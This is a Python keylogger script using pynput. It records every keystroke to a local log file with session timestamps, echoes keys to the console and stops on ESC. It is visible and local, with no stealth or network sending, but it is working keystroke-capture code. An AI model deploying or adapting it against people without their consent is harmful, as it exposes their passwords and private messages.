import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime

# Configuration
LOG_FILE = "log.txt"

def format_key(key):
    """Format key for better readability"""
    if hasattr(key, 'char') and key.char is not None:
        return key.char
    else:
        # Special keys mapping - cleaner format
        special_keys = {
            'Key.space': ' ',
            'Key.enter': '\n',
            'Key.tab': '\t',
            'Key.backspace': '[BACKSPACE]',
            'Key.delete': '[DELETE]',
            'Key.shift': '',  # Don't show shift
            'Key.shift_r': '',
            'Key.shift_l': '',
            'Key.ctrl': '[CTRL]',
            'Key.ctrl_l': '[CTRL]',
            'Key.ctrl_r': '[CTRL]',
            'Key.alt': '[ALT]',
            'Key.alt_l': '[ALT]',
            'Key.alt_r': '[ALT]',
        }
        key_str = str(key)
        return special_keys.get(key_str, f'[{key_str}]')

def on_press(key):
    """Handle key press events"""
    write_file(key)
    
    try:
        print(f'Alphanumeric key "{key.char}" pressed')
    except AttributeError:
        print(f'Special key {key} pressed')

def write_file(key):
    """Write key to log file - clean continuous format"""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            formatted_key = format_key(key)
            f.write(formatted_key)
            
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    """Handle key release events"""
    if key == Key.esc:
        print("\n" + "="*50)
        print("KeyLogger stopped!")
        print(f"Log saved to: {LOG_FILE}")
        print("="*50)
        return False

def main():
    """Main function to start keylogger"""
    # Create session header with timestamp
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"\n\n{'='*60}\n")
            f.write(f"Session: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n")
    except Exception as e:
        print(f"Error creating log file: {e}")
        return
    
    print("="*50)
    print("KeyLogger Started")
    print(f"Logging to: {LOG_FILE}")
    print("Press ESC to stop")
    print("="*50)
    
    # Start listener
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
